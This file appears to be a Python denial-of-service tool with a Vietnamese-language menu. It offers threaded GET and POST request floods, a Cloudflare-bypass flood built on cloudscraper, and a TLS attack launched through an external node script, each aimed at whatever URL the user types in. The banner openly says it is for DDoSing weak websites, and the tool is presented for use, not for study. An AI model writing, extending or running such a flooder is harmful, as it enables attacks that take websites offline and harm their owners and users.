from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time
from sys import stdout
from colorama import Fore, init
os.system("clear")
stdout.write(Fore.CYAN+"Tool được phát triển bởi Khang Phan\n")
stdout.write(Fore.RED+":))) TOOL NÀY DDOS WEB YẾU THÔI NHA MẤY ÔNG CHÁU\n")



def l7():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+"[1] • "+Fore.WHITE+"CFB        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
    stdout.write(Fore.MAGENTA+"[2] • "+Fore.WHITE+"GET        "+Fore.RED+": "+Fore.WHITE+"Get Request attack\n")
    stdout.write(Fore.MAGENTA+"[3] • "+Fore.WHITE+"POST       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+"[4] • "+Fore.WHITE+"TLS        "+Fore.RED+": "+Fore.WHITE+"TLS attack\n")
    cm=input('Chọn Method:')
    if cm=='2':
        url=input('URL:')
        th=int(input('Thread:'))
        get(url,th)
    elif cm=='1':
        url=input('URL:')
        th=int(input('Thread:'))
        LaunchCFB(url, th)
    elif cm=='4':
        url=input('URL:')
        time=input('Time:')
        os.system(f"node tls.js {url} {time}")
    elif cm=='3':
        url=input('URL:')
        th=int(input('Thread:'))
        post(url,th)



def get(url,th):
    start = time.perf_counter()
    client = requests.Session()

 
    	
    def request(secret_number):
        print('Method:Get | Status code:', client.get(url.format(secret_number), timeout=1000).status_code,'| Luồng:', threading.active_count())
    
    tasks = []
    
    for secret in range(th):
        # Tạo thread và khởi động chúng
        task = threading.Thread(target=request, args=(secret,))       
        task.start()
        tasks.append(task)
def post(url,th):
    start = time.perf_counter()
    client = requests.Session()

 
    	
    def request(secret_number):
        print('Method:Post | Status code:', client.post(url.format(secret_number), timeout=1000).status_code,'| Luồng:', threading.active_count())
    
    tasks = []
    
    for secret in range(th):
        
        task = threading.Thread(target=request, args=(secret,))       
        task.start()
        tasks.append(task)

        
       
        
    
  
    
def LaunchCFB(url, th):
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        thd = threading.Thread(target=AttackCFB, args=(url, scraper))
        thd.start()


def AttackCFB(url, scraper):
    print('Method:CloudFlare Bypass | Status code:', scraper.get(url, timeout=1000).status_code,'| Luồng:', threading.active_count())
stdout.write(Fore.MAGENTA+"[1] • "+Fore.WHITE+"Liên hệ\n")
stdout.write(Fore.CYAN+"[2] • "+Fore.WHITE+"DDoS\n")
stdout.write(Fore.RED+"->")
in4orddos=input()
os.system("clear")
if in4orddos=='1':
    stdout.write(Fore.MAGENTA+"-> "+Fore.YELLOW+"Zalo    "+Fore.RED+": 0947313943\n")
    stdout.write(Fore.WHITE+"•"+ "Nhấn 2 để qua tấn công DDoS.\n")
    stdout.write(Fore.RED+"->")
    ex=input()
    if ex=='2':
        os.system("clear")
        l7()
elif in4orddos=='2':
	    l7()